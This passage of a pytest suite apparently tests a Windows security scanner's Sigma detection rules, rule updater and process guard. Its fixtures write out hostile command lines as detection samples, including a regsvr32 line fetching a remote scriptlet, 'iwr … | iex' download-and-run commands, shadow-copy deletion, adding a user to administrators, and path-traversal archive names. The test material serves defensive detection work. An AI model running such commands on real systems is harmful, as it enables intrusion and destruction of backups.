        {"_service": "security", "EventID": "1102", "Provider_Name": "Microsoft-Windows-Eventlog"},
    ],
    "Regsvr32 Loads Remote Script via Scrobj (Squiblydoo)": [
        proc(r"C:\Windows\System32\regsvr32.exe", "regsvr32 /s /n /u /i:http://203.0.113.5/f.sct scrobj.dll"),
        proc(r"C:\Windows\System32\regsvr32.exe", r"regsvr32.exe /s /u /i:\\server\share\f.sct scrobj.dll"),
    ],
}

BENIGN = [
    proc(r"C:\Program Files\Google\Chrome\Application\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer', r"C:\Windows\explorer.exe"),
    proc(r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule", r"C:\Windows\System32\services.exe"),
    proc(PS_EXE, r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Backup.ps1"),
    proc(PS_EXE, r"powershell.exe -ExecutionPolicy Bypass -Command Get-Date"),
    proc(PS_EXE, "powershell -e"),
    proc(PS_EXE, r"powershell.exe -w hidden -File C:\Scripts\tray.ps1", r"C:\Windows\explorer.exe"),
    proc(PS_EXE, 'powershell -c "iwr http://intranet/x | iex"', r"C:\Windows\explorer.exe"),
    proc(r"C:\Windows\System32\net.exe", "net user"),
    proc(r"C:\Windows\System32\net.exe", "net localgroup administrators"),
    proc(r"C:\Windows\System32\net.exe", "net localgroup users bob /add"),
    proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin list shadows"),
    proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /for=C: /oldest"),
    proc(r"C:\Windows\System32\certutil.exe", r"certutil -hashfile C:\f.iso SHA256"),
    proc(r"C:\Windows\System32\schtasks.exe", r'schtasks /create /tn Backup /tr "C:\Program Files\Backup\b.exe" /sc daily'),
    proc(r"C:\Windows\System32\schtasks.exe", "schtasks /query"),
    proc(r"C:\Windows\System32\mshta.exe", r'mshta.exe "C:\Program Files\App\help.hta"'),
    proc(r"C:\Windows\System32\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
    proc(r"C:\Windows\System32\bitsadmin.exe", "bitsadmin /list"),
    proc(PS_EXE, "powershell Set-MpPreference -ScanAvgCPULoadFactor 30"),
    proc(PS_EXE, "powershell Add-MpPreference -ExclusionPath 'D:\\Builds\\cache'"),
    proc(r"C:\Windows\System32\splwow64.exe", "splwow64.exe 8192", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    proc(r"C:\Tools\procdump64.exe", "procdump64.exe -ma notepad.exe"),
    proc(r"C:\Windows\System32\regsvr32.exe", r'regsvr32 /s "C:\Program Files\App\x.dll"'),
    proc(r"C:\Windows\System32\cmd.exe", "cmd.exe /c dir", r"C:\Windows\explorer.exe"),
    {"_category": "registry_set", "TargetObject": r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a", "Details": r"notepad C:\x.txt\1"},
    {"_category": "registry_set", "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection", "Details": "DWORD (0x00000005)"},
    {"_category": "file_event", "TargetFilename": r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.lnk"},
    {"_category": "network_connection", "Image": r"C:\Windows\System32\mshta.exe", "Initiated": "true", "DestinationIp": "10.1.2.3"},
    {"_category": "network_connection", "Image": r"C:\Windows\System32\wscript.exe", "Initiated": "true", "DestinationIp": "192.168.1.5"},
    {"_category": "network_connection", "Image": r"C:\Windows\System32\mshta.exe", "Initiated": "true", "DestinationIp": "fe80::1"},
    {"_category": "network_connection", "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "Initiated": "true", "DestinationIp": "203.0.113.5"},
    {"_category": "image_load", "Image": r"C:\Windows\System32\svchost.exe", "ImageLoaded": r"C:\Users\Public\ok.dll", "Signed": "true"},
    {"_category": "image_load", "Image": r"C:\Windows\explorer.exe", "ImageLoaded": r"C:\Program Files\App\shell.dll", "Signed": "false"},
    {"_service": "security", "EventID": "4624"},
    {"_service": "system", "Provider_Name": "Service Control Manager", "EventID": "7045", "ServiceName": "VendorSvc", "ImagePath": r'"C:\Program Files\Vendor\svc.exe" -service'},
    {"_category": "ps_script", "ScriptBlockText": "Get-ChildItem C:\\ | Where-Object Length -gt 1000"},
    {"_category": "ps_script", "ScriptBlockText": "Set-MpPreference -ScanScheduleDay 3"},
]


@pytest.fixture(scope="module")
def bundled():
    return S.load_rules(None)


def test_bundled_rule_metadata_is_complete_and_current(bundled):
    ids, titles = set(), set()
    files = sorted(BUNDLED_DIR.glob("*.yml"))
    assert 10 <= len(files) <= 20 and len(bundled) == len(files)
    for f in files:
        text = f.read_text(encoding="utf-8")
        assert "MIT License" in text.splitlines()[1] and text.startswith("# Aegis Security Suite"), f.name  # license header
        doc = yaml.safe_load(text)
        assert doc.get("license") == "MIT" and doc["author"] == "Aegis Security Suite", f.name
        assert doc["id"] not in ids and doc["title"] not in titles, f.name
        ids.add(doc["id"])
        titles.add(doc["title"])
        assert doc["description"] and doc["references"] and doc["falsepositives"] and doc["status"] == "stable", f.name
        assert doc["level"] in ("medium", "high", "critical") and doc["date"], f.name
        assert not any(t in RETIRED for t in S.attack_ids_from_tags(doc["tags"])), f.name
        assert not any(str(t).lower().replace("attack.", "").upper() in RETIRED for t in doc["tags"]), f.name  # no retired ids authored
        assert S.attack_ids_from_tags(doc["tags"]), f"{f.name} needs an ATT&CK technique tag"
    for r in bundled.rules:
        assert r.rule_id.startswith("SIGMA-") and len(r.rule_id) == 14 and r.mitre and r.references and r.logsource.get("product") == "windows"
    assert titles == set(POSITIVES), "every bundled rule needs positive test events (and no stale entries)"


@pytest.mark.parametrize("title", sorted(POSITIVES))
def test_bundled_rule_fires_on_positive_events(bundled, title):
    for ev in POSITIVES[title]:
        got = [r.title for r, _ in bundled.match(ev)]
        assert title in got, f"{title!r} did not fire on {ev}; got {got}"
        assert len(got) == 1, f"{ev} also matched {got}"  # each behaviour is reported once


@pytest.mark.parametrize("ev", BENIGN, ids=lambda e: (e.get("CommandLine") or e.get("TargetObject") or e.get("TargetFilename") or
                                                         e.get("ImagePath") or e.get("ImageLoaded") or e.get("ScriptBlockText") or
                                                         e.get("DestinationIp") or e.get("EventID") or "event")[:50])
def test_bundled_rules_stay_quiet_on_benign_events(bundled, ev):
    assert bundled.match(ev) == []


def test_bundled_rules_do_not_fire_on_unrouted_events_and_other_products(bundled):
    ev = dict(POSITIVES["Certutil Used to Download a File"][0])
    assert bundled.match({k: v for k, v in ev.items() if k != "_category"}) == []
    assert bundled.match(dict(ev, _product="linux")) == []


def test_bundled_findings_carry_the_rule_metadata(bundled):
    ev = POSITIVES["Shadow Copies or Backups Deleted"][0]
    (f,) = S.sigma_findings([dict(ev, _log="Security", _event_id=4688, _ts=T0)], bundled)
    assert f.title == "Sigma: Shadow Copies or Backups Deleted" and f.severity == Severity.HIGH and f.mitre == ["T1490"]
    assert f.rule_id.startswith("SIGMA-") and f.evidence["references"] and "ransomware" in f.description.lower()
    assert "Backup and disk-clean-up" in f.recommendation


def test_remap_table_matches_retired_list():
    table = {}
    for line in (BUNDLED_DIR / "attack_v20_remap.tsv").read_text(encoding="utf-8").splitlines():
        if line.strip() and not line.startswith("#"):
            old, new = line.split("\t")
            table[old] = new
    assert set(table) == RETIRED and table["T1562.001"] == "T1685" and table["T1070.001"] == "T1685.005"
    assert not (set(table.values()) & RETIRED)


# =========================================================================== updater (mocked network)

def sigma_zip(n=6, extra=None, root="rules/windows/"):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for i in range(n):
            z.writestr(f"{root}process_creation/proc_creation_win_t{i}.yml",
                       rule_yaml(f"  s:\n    Image|endswith: '\\t{i}.exe'\n  condition: s", f"Upstream {i}", f"1000000{i}-0000-0000-0000-000000000000"))
        z.writestr("rules/linux/process_creation/lnx.yml", rule_yaml("  s:\n    Image: a\n  condition: s", "Linux", "20000000-0000-0000-0000-000000000000"))
        z.writestr("rules/windows/readme.txt", "not a rule")
        z.writestr("version.txt", "Release Date: 2026-07-09\nLabel: r2026-04-01\n")
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


class Resp(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def route(monkeypatch, payload, seen=None):
    def fake(req, timeout=None):
        if seen is not None:
            seen.append((req.full_url, dict((k.lower(), v) for k, v in req.header_items()), timeout))
        if isinstance(payload, Exception):
            raise payload
        return Resp(payload)

    monkeypatch.setattr("urllib.request.urlopen", fake)


@pytest.fixture
def small_min(monkeypatch):
    monkeypatch.setattr(U, "MIN_RULES", 3)


def cfg_for(tmp_path):
    d = tmp_path / "sigs"
    d.mkdir()
    return SimpleNamespace(signatures_dir=d)


def tree(d: Path):
    return sorted(str(p.relative_to(d)).replace("\\", "/") for p in d.rglob("*") if p.is_file())


def test_update_installs_only_windows_rules_and_writes_manifest(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    seen = []
    route(monkeypatch, sigma_zip(), seen)
    progress = []
    res = U.update_sigma_rules(cfg, progress=lambda name, msg: progress.append((name, msg)))
    r = res["sigma"]
    assert r["ok"] is True and r["count"] == 6 and r["error"] == "" and r["package"] == "core" and r["unsupported"] == 0
    assert r["source"] == "https://github.com/SigmaHQ/sigma/releases/latest/download/sigma_core.zip" and len(r["sha256"]) == 64
    assert "2026-07-09" in r["release"]
    assert seen[0][0] == r["source"] and seen[0][1]["user-agent"].startswith("Aegis") and seen[0][2] and seen[0][2] > 0
    assert progress and all(p[0] == "sigma" for p in progress)
    files = tree(cfg.signatures_dir / "sigma")
    assert files == ["NOTICE.txt", "manifest.json"] + [f"process_creation/proc_creation_win_t{i}.yml" for i in range(6)]
    manifest = json.loads((cfg.signatures_dir / "sigma" / "manifest.json").read_text())
    assert manifest["rules"] == 6 and manifest["license"] == "DRL-1.1" and manifest["package"] == "core"
    assert "Detection Rule License" in (cfg.signatures_dir / "sigma" / "NOTICE.txt").read_text()
    assert U.installed_manifest(cfg)["sha256"] == r["sha256"]
    assert [d for d in cfg.signatures_dir.iterdir() if d.name.startswith(".sigma")] == []  # no temp dirs left behind
    rs = S.load_rules(cfg, include_bundled=False)
    assert len(rs) == 6 and {x.origin for x in rs.rules} == {"downloaded"}
    assert rs.match(pc(Image=r"C:\x\t3.exe"))[0][0].title == "Upstream 3"


def test_update_replaces_previous_rules_atomically(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    route(monkeypatch, sigma_zip(5))
    assert U.update_sigma_rules(cfg)["sigma"]["count"] == 5
    (cfg.signatures_dir / "sigma" / "stale.yml").write_text("title: stale")
    route(monkeypatch, sigma_zip(4))
    assert U.update_sigma_rules(cfg)["sigma"]["count"] == 4
    assert "stale.yml" not in tree(cfg.signatures_dir / "sigma") and len(S.load_rules(cfg, include_bundled=False)) == 4
    assert (cfg.signatures_dir / "sigma_custom").exists() is False  # the managed directory is the only one touched


def test_update_validation_failure_keeps_previous_rules(tmp_path, monkeypatch):
    cfg = cfg_for(tmp_path)
    monkeypatch.setattr(U, "MIN_RULES", 3)
    route(monkeypatch, sigma_zip(5))
    assert U.update_sigma_rules(cfg)["sigma"]["ok"]
    before = {f: (cfg.signatures_dir / "sigma" / f).read_bytes() for f in tree(cfg.signatures_dir / "sigma")}
    monkeypatch.setattr(U, "MIN_RULES", 500)  # the real threshold: a 2-rule package is not a Sigma release
    route(monkeypatch, sigma_zip(2))
    res = U.update_sigma_rules(cfg)["sigma"]
    assert res["ok"] is False and res["count"] == 0 and "only 2 rules parsed" in res["error"]
    assert {f: (cfg.signatures_dir / "sigma" / f).read_bytes() for f in tree(cfg.signatures_dir / "sigma")} == before
    assert [d for d in cfg.signatures_dir.iterdir() if d.name.startswith(".sigma")] == []


@pytest.mark.parametrize("payload,needle", [
    (b"this is not a zip", "not a zip"),
    (b"<html>rate limited</html>", "not a zip"),
])
def test_update_bad_download_keeps_previous_rules(tmp_path, monkeypatch, small_min, payload, needle):
    cfg = cfg_for(tmp_path)
    route(monkeypatch, sigma_zip(5))
    U.update_sigma_rules(cfg)
    route(monkeypatch, payload)
    res = U.update_sigma_rules(cfg)["sigma"]
    assert res["ok"] is False and needle in res["error"]
    assert len(S.load_rules(cfg, include_bundled=False)) == 5


def test_update_zip_without_windows_rules_fails(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("rules/linux/a.yml", "title: x")
    route(monkeypatch, buf.getvalue())
    res = U.update_sigma_rules(cfg)["sigma"]
    assert not res["ok"] and "no rules/windows" in res["error"] and not (cfg.signatures_dir / "sigma").exists()


@pytest.mark.parametrize("exc,needle", [
    (urllib.error.HTTPError("u", 404, "Not Found", {}, None), "HTTP 404"),
    (urllib.error.URLError("no route"), "URLError"),
    (TimeoutError("slow"), "TimeoutError"),
])
def test_update_network_errors_never_raise_and_keep_previous(tmp_path, monkeypatch, small_min, exc, needle):
    cfg = cfg_for(tmp_path)
    route(monkeypatch, sigma_zip(5))
    U.update_sigma_rules(cfg)
    route(monkeypatch, exc)
    msgs = []
    res = U.update_sigma_rules(cfg, progress=msgs.append)["sigma"]  # single-argument progress callbacks work too
    assert res["ok"] is False and needle in res["error"] and msgs and "previous rules kept" in msgs[-1]
    assert len(S.load_rules(cfg, include_bundled=False)) == 5


def test_update_swap_failure_restores_previous_rules(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    route(monkeypatch, sigma_zip(5))
    U.update_sigma_rules(cfg)
    real = U._replace_dir
    calls = {"n": 0}

    def flaky(src, dst, attempts=4):
        calls["n"] += 1
        if calls["n"] == 2:  # the move of the new tree into place fails after the old one was moved away
            raise PermissionError("locked")
        return real(src, dst, attempts)

    monkeypatch.setattr(U, "_replace_dir", flaky)
    route(monkeypatch, sigma_zip(4))
    res = U.update_sigma_rules(cfg)["sigma"]
    assert res["ok"] is False and "PermissionError" in res["error"]
    assert len(S.load_rules(cfg, include_bundled=False)) == 5 and (cfg.signatures_dir / "sigma").is_dir()
    assert [d for d in cfg.signatures_dir.iterdir() if d.name.startswith(".sigma")] == []


def test_update_member_sanitising_blocks_path_traversal(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    good = rule_yaml("  s:\n    Image: a\n  condition: s", "Evil", "30000000-0000-0000-0000-000000000000")
    zbytes = sigma_zip(4, extra={"rules/windows/../../evil.yml": good, "rules/windows/a/../../../evil2.yml": good,
                                  "/rules/windows/abs.yml": good, "rules/windows/..\\evil3.yml": good,
                                  "rules/windows/sub/ok name (1).yml": good,
                                  "rules/windows/huge.yml": "title: x\n" + "#" * (U.MAX_MEMBER_BYTES + 10)})
    route(monkeypatch, zbytes)
    res = U.update_sigma_rules(cfg)["sigma"]
    assert res["ok"], res
    names = tree(cfg.signatures_dir / "sigma")
    assert all(".." not in n for n in names) and "sub/ok name (1).yml" in names and "huge.yml" not in names
    assert not list(tmp_path.glob("evil*")) and not list(cfg.signatures_dir.glob("evil*"))
    assert not any(p.name.startswith("evil") for p in tmp_path.rglob("*.yml"))


def test_update_accepts_wrapped_archives_and_counts_unsupported(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    agg = rule_yaml("  s:\n    Image: a\n  condition: s | count() > 2\n", "Agg")
    route(monkeypatch, sigma_zip(4, extra={"sigma-main/rules/windows/process_creation/agg.yml": agg}, root="sigma-main/rules/windows/"))
    res = U.update_sigma_rules(cfg)["sigma"]
    assert res["ok"] and res["count"] == 4 and res["unsupported"] == 1


def test_update_package_selection_and_urls(tmp_path, monkeypatch, small_min):
    assert U.package_url("core") == "https://github.com/SigmaHQ/sigma/releases/latest/download/sigma_core.zip"
    assert U.package_url("core+").endswith("/sigma_core+.zip") and U.package_url("all").endswith("/sigma_all_rules.zip")
    with pytest.raises(ValueError):
        U.package_url("nope")
    cfg = cfg_for(tmp_path)
    seen = []
    route(monkeypatch, sigma_zip(4), seen)
    assert U.update_sigma_rules(cfg, package="core++")["sigma"]["package"] == "core++" and seen[-1][0].endswith("/sigma_core++.zip")
    monkeypatch.setenv("AEGIS_SIGMA_PACKAGE", "all")
    U.update_sigma_rules(cfg)
    assert seen[-1][0].endswith("/sigma_all_rules.zip")
    cfg.sigma_package = "core+"
    U.update_sigma_rules(cfg)
    assert seen[-1][0].endswith("/sigma_core+.zip")
    n = len(seen)
    bad = U.update_sigma_rules(cfg, package="bogus")["sigma"]
    assert not bad["ok"] and "unknown Sigma package" in bad["error"] and len(seen) == n  # no download for an unknown package


def test_update_download_size_limit(tmp_path, monkeypatch, small_min):
    cfg = cfg_for(tmp_path)
    monkeypatch.setattr(U, "MAX_DOWNLOAD_BYTES", 1000)
    route(monkeypatch, sigma_zip(5))
    res = U.update_sigma_rules(cfg)["sigma"]
    assert not res["ok"] and "size limit" in res["error"] and not (cfg.signatures_dir / "sigma").exists()


# =========================================================================== eventlog integration

def fake_collect(by_key, problem=""):
    def collect(spec, days=el.LOOKBACK_DAYS):
        return el.LogData(spec, list(by_key.get(spec.key, [])), not problem, problem, {"Oldest": "2026-10-01T00:00:00Z"}, [])
    return collect


def run_scanner(monkeypatch, ctx, by_key, **opts):
    monkeypatch.setattr(el, "IS_WINDOWS", True)
    monkeypatch.setattr(el, "collect_log", fake_collect(by_key))
    monkeypatch.setattr(el, "reg_read", lambda *a, **k: None)
    ctx.is_admin = True
    ctx.options.update(opts)
    return list(el.EventLogScanner().run(ctx))


ENC = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="


def test_sigma_hunt_finds_events_and_reports_counts():
    logs = {"security": [E(4688, NewProcessName=r"C:\Windows\System32\net.exe", CommandLine="net localgroup administrators bob /add",
                           SubjectUserName="bob", SubjectDomainName="PC"),
                         E(4688, "Security", 1, NewProcessName=r"C:\Windows\System32\notepad.exe", CommandLine="notepad")],
            "sysmon": [E(13, "Sysmon", 2, Image=r"C:\Windows\explorer.exe",
                         TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a",
                         Details='powershell -w hidden -c "iwr http://x | iex"')], "system": []}
    found, info = el.sigma_hunt(logs)
    assert sorted(f.title for f in found) == ["Sigma: Suspicious Command Pasted Into the Windows Run Dialog",
                                              "Sigma: User Added to the Local Administrators Group With net.exe"]
    assert info["status"] == "ok" and info["matches"] == 2 and info["rules"] >= 10 and info["evaluated"] == 3
    assert "3 event" in info["detail"]
    assert all(f.evidence["log"] in ("Security", "Sysmon") and f.evidence["time"].startswith("2026-10-14") for f in found)
    assert el.sigma_hunt({"security": []})[1]["status"] == "no_events"
    _, info = el.sigma_hunt(logs, ruleset=S.SigmaRuleSet())
    assert info["status"] == "no_rules"
    _, info = el.sigma_hunt(logs, deadline=time.monotonic() - 1)
    assert info["status"] == "truncated" and "budget" in info["detail"]


def test_merge_prefers_native_finding_and_folds_sigma_into_it():
    ev_a = E(4688, "Security", 0, NewProcessName=r"C:\x\powershell.exe", CommandLine="powershell -enc " + ENC)
    ev_b = E(13, "Sysmon", 5, Image=r"C:\Windows\explorer.exe",
             TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a",
             Details='powershell -w hidden -c "iwr http://x | iex"')
    native = el.detect_process_creation([ev_a])
    assert [f.rule_id for f in native] == ["AEG-EVT-PROC"]
    sig, _ = el.sigma_hunt({"security": [ev_a], "sysmon": [ev_b]})
    assert len(sig) == 2
    merged = el.merge_sigma_findings(native, sig)
    assert len(merged) == 2 and merged[0] is native[0]  # event A: folded into the native finding; event B: Sigma-only, kept
    nat = merged[0]
    assert nat.evidence["sigma_rules"][0]["title"] == "PowerShell Started With an Encoded Command"
    assert "Sigma rule" in nat.description and nat.remediation is None
    assert nat.evidence["source"] == "eventlog" and "T1027.010" in nat.mitre and nat.rule_id == "AEG-EVT-PROC"
    assert merged[1].title == "Sigma: Suspicious Command Pasted Into the Windows Run Dialog"
    assert merged[1].evidence["time"] == el.fmt_time(T0 + 5)


def test_merge_keeps_both_when_event_or_technique_differs_and_takes_higher_severity():
    ev = E(1102, "Security")
    native = el.detect_log_cleared([ev])  # AEG-EVT-CLEARED, HIGH, T1685.005
    assert native and native[0].severity == Severity.HIGH
    same = S.finding_for_match(make_rule(sel(EventID="1102"), level="critical", tags=["attack.t1685.005"], title="Crit"), {},
                               {"EventID": "1102", "_log": "Security", "_event_id": 1102, "_ts": ev["ts"]})
    other_tech = S.finding_for_match(make_rule(sel(EventID="1102"), tags=["attack.t1003.001"], title="Other"), {},
                                     {"EventID": "1102", "_log": "Security", "_event_id": 1102, "_ts": ev["ts"]})
    other_event = S.finding_for_match(make_rule(sel(EventID="1102"), tags=["attack.t1685.005"], title="Later"), {},
                                      {"EventID": "1102", "_log": "Security", "_event_id": 1102, "_ts": ev["ts"] + 60})
    no_event = S.finding_for_match(make_rule(sel(EventID="1102"), tags=["attack.t1685.005"], title="NoEvent"), {}, {"EventID": "1102"})
    merged = el.merge_sigma_findings(native, [same, other_tech, other_event, no_event])
    assert len(merged) == 4 and merged[0] is native[0]
    assert merged[0].severity == Severity.CRITICAL and merged[0].evidence["sigma_rules"][0]["title"] == "Crit"
    assert {f.title for f in merged[1:]} == {"Sigma: Other", "Sigma: Later", "Sigma: NoEvent"}


def test_analyse_all_plus_sigma_reports_one_finding_per_behaviour():
    logs = {"security": [E(1102, "Security", 0), E(4688, "Security", 1, NewProcessName=r"C:\Windows\System32\vssadmin.exe",
                                                  CommandLine="vssadmin delete shadows /all /quiet")],
            "sysmon": [E(13, "Sysmon", 2, Image=r"C:\Windows\regedit.exe",
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users")]}
    native = el.analyse_all(logs)
    sig, _ = el.sigma_hunt(logs)
    assert len(sig) == 3
    merged = el.merge_sigma_findings(native, sig)
    titles = [f.title for f in merged]
    assert len(merged) == len(native) + 1  # only the registry exclusion has no native counterpart
    assert "Sigma: Microsoft Defender Exclusion Added in the Registry" in titles
    assert not any(t in titles for t in ("Sigma: Windows Security Event Log Cleared", "Sigma: Shadow Copies or Backups Deleted"))
    folded = {f.rule_id: f.evidence["sigma_rules"][0]["title"] for f in merged if f.evidence.get("sigma_rules")}
    assert folded["AEG-EVT-CLEARED"] == "Windows Security Event Log Cleared"
    assert folded["AEG-EVT-PROC"] == "Shadow Copies or Backups Deleted"


def test_scanner_end_to_end_reports_sigma_findings_and_check(monkeypatch, ctx):
    by_key = {"security": [E(4688, NewProcessName=r"C:\Windows\System32\vssadmin.exe", CommandLine="vssadmin delete shadows /all /quiet",
                             SubjectUserName="bob", SubjectDomainName="PC"),
                           E(1102, "Security", 3)],
              "sysmon": [E(13, "Sysmon", 5, Image=r"C:\Windows\regedit.exe",
                           TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users")]}
    out = run_scanner(monkeypatch, ctx, by_key)
    findings = [x for x in out if isinstance(x, Finding)]
    checks = {c.check_id: c for c in out if isinstance(c, CheckResult)}
    titles = [f.title for f in findings]
    assert "Sigma: Microsoft Defender Exclusion Added in the Registry" in titles  # Sigma-only behaviour: reported as such
    # behaviours the scanner already detects natively are not reported twice: the native finding gains the Sigma rule
    assert not any(t in titles for t in ("Sigma: Windows Security Event Log Cleared", "Sigma: Shadow Copies or Backups Deleted"))
    cleared = [f for f in findings if f.rule_id == "AEG-EVT-CLEARED"]
    assert len(cleared) == 1 and cleared[0].evidence["sigma_rules"][0]["title"] == "Windows Security Event Log Cleared"
    proc = [f for f in findings if f.rule_id == "AEG-EVT-PROC"]
    assert len(proc) == 1 and proc[0].evidence["sigma_rules"][0]["title"] == "Shadow Copies or Backups Deleted"
    assert checks["AEG-EVT-SIGMA"].status == CheckStatus.PASS and "Sigma rule" in checks["AEG-EVT-SIGMA"].detail
    assert ctx.stats["sigma_matches"] == 3
    json.dumps([x.to_dict() for x in out])
    registry = [g for g in el.LOG_SPECS if g.key == "sysmon"][0]
    assert any(13 in g.ids for g in registry.groups)  # registry value sets are collected for Sigma registry rules


SIGMA_ONLY = {"sysmon": [E(13, "Sysmon", 5, Image=r"C:\Windows\regedit.exe",
                           TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users")]}


def sigma_titles(out):
    return [x.title for x in out if isinstance(x, Finding) and x.rule_id.startswith("SIGMA-")]


def sigma_check(out):
    return next(x for x in out if isinstance(x, CheckResult) and x.check_id == "AEG-EVT-SIGMA")


def test_scanner_sigma_can_be_disabled_and_degrades_gracefully(monkeypatch, ctx):
    assert sigma_titles(run_scanner(monkeypatch, ctx, SIGMA_ONLY)) == ["Sigma: Microsoft Defender Exclusion Added in the Registry"]
    ctx.stats.clear()
    off = run_scanner(monkeypatch, ctx, SIGMA_ONLY, sigma=False)
    assert sigma_titles(off) == [] and not any(isinstance(x, CheckResult) and x.check_id == "AEG-EVT-SIGMA" for x in off)
    ctx.options.pop("sigma", None)

    with monkeypatch.context() as m:  # PyYAML missing
        m.setattr(S, "_yaml", lambda: None)
        out = run_scanner(m, ctx, SIGMA_ONLY)
        assert sigma_titles(out) == [] and sigma_check(out).status == CheckStatus.SKIP and "PyYAML" in sigma_check(out).detail
        assert any(isinstance(x, CheckResult) and x.check_id == "AEG-EVT-LOG-SYSMON" for x in out)  # the rest of the hunt ran

    with monkeypatch.context() as m:  # an engine failure never breaks the scan
        m.setattr(S, "load_rules", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("disk on fire")))
        out = run_scanner(m, ctx, SIGMA_ONLY)
        assert sigma_check(out).status == CheckStatus.ERROR and "disk on fire" in sigma_check(out).detail
        assert any(isinstance(x, CheckResult) and x.check_id == "AEG-EVT-LOG-SYSMON" for x in out)


def test_scanner_respects_the_time_budget_for_sigma(monkeypatch, ctx):
    state = {"late": False}
    monkeypatch.setattr(el.time, "monotonic", lambda: 1e9 if state["late"] else 0.0)  # budget runs out after the log reads
    real = el.analyse_all
    monkeypatch.setattr(el, "analyse_all", lambda *a, **k: (state.update(late=True), real(*a, **k))[1])
    out = run_scanner(monkeypatch, ctx, SIGMA_ONLY, eventlog_budget_s=100)
    assert sigma_check(out).status == CheckStatus.WARN and "budget" in sigma_check(out).detail
    assert sigma_titles(out) == []
    assert any(isinstance(x, CheckResult) and x.check_id == "AEG-EVT-LOG-SYSMON" and x.status == CheckStatus.PASS for x in out)


# =========================================================================== ProcessGuard integration

@pytest.fixture
def cfg(tmp_path):
    c = Config()
    c.notifications = False
    return c


def make_guard(cfg, monkeypatch, **kw):
    monkeypatch.setattr(M, "IS_WINDOWS", True)  # the bundled rules target Windows events
    events = []
    mon = M.RealtimeMonitor(cfg, SimpleNamespace(), on_event=events.append, components=())
    mon.ransomware.suspend_enabled = False
    kw.setdefault("scan_fn", lambda ctx, p: [])
    return M.ProcessGuard(mon, **kw), mon, events


def pinfo(**kw):
    d = {"pid": 2 ** 22 + 21, "name": "powershell.exe", "exe": PS_EXE, "ppid": 1, "parent_name": "explorer.exe",
         "parent_exe": r"C:\Windows\explorer.exe", "parent_cmdline": r"C:\Windows\Explorer.EXE", "username": "PC\\bob",
         "create_time": 1.0, "cmdline": ["powershell.exe", "-NoProfile", "-File", r"C:\Scripts\Backup.ps1"]}
    d.update(kw)
    return d


def sigma_only_guard(cfg, monkeypatch, rules=None):
    """A guard whose own analysis is switched off, so only the Sigma hook produces findings."""
    rules = rules if rules is not None else S.load_rules(None, categories=("process_creation",))
    return make_guard(cfg, monkeypatch, sigma_rules=rules, analyse_fn=lambda cmd: [])


def test_process_guard_emits_sigma_findings_for_new_processes(cfg, monkeypatch):
    pg, mon, events = sigma_only_guard(cfg, monkeypatch)
    bad = pinfo(cmdline=["vssadmin.exe", "delete", "shadows", "/all", "/quiet"], exe=r"C:\Windows\System32\vssadmin.exe",
                name="vssadmin.exe", parent_name="cmd.exe", parent_exe=r"C:\Windows\System32\cmd.exe")
    findings = pg.handle(bad)
    assert [f.title for f in findings] == ["Sigma: Shadow Copies or Backups Deleted"]
    f = findings[0]
    assert f.rule_id.startswith("SIGMA-") and f.severity == Severity.HIGH and f.mitre == ["T1490"] and f.scanner == "realtime"
    assert f.evidence["pid"] == bad["pid"] and f.evidence["parent"] == "cmd.exe" and f.evidence["source"] == "sigma"
    assert f.remediation.action == "kill_process" and f.remediation.params["pid"] == bad["pid"]
    assert [e.title for e in events] == [f.title] and mon.stats["events"] == 1  # emitted through the monitor
    assert str(bad["pid"]) in f.location
    json.dumps(f.to_dict())
    for benign in (pinfo(), pinfo(exe=r"C:\Program Files\Google\Chrome\Application\chrome.exe", name="chrome.exe",
                                   cmdline=["chrome.exe", "--type=renderer"]),
                   pinfo(exe=r"C:\Windows\System32\svchost.exe", name="svchost.exe", parent_name="services.exe",
                         parent_exe=r"C:\Windows\System32\services.exe", cmdline=["svchost.exe", "-k", "netsvcs"])):
        assert pg.evaluate(benign) == []


def test_process_guard_with_native_analysis_reports_each_behaviour_once(cfg, monkeypatch):
    pg, _, _ = make_guard(cfg, monkeypatch, sigma_rules=S.load_rules(None, categories=("process_creation",)))  # real analysis
    bad = pinfo(cmdline=["vssadmin.exe", "delete", "shadows", "/all", "/quiet"], exe=r"C:\Windows\System32\vssadmin.exe",
                name="vssadmin.exe", parent_name="cmd.exe", parent_exe=r"C:\Windows\System32\cmd.exe")
    findings = pg.evaluate(bad)
